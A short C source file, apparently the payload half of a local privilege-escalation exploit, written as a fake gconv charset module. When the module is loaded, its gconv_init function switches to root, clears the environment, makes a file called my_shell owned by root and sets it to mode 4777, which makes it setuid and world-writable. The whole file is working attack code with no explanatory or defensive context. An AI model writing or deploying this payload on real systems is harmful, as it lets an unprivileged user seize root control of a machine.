#include <unistd.h>
#include <stdlib.h>
#include <gconv.h>

int gconv_init() {
    setuid(0);
    setgid(0);

    clearenv();
    putenv("PATH=/usr/bin");
    
    system("/usr/bin/chown root my_shell");
    system("/usr/bin/chmod 4777 my_shell");
}

void gconv(){}
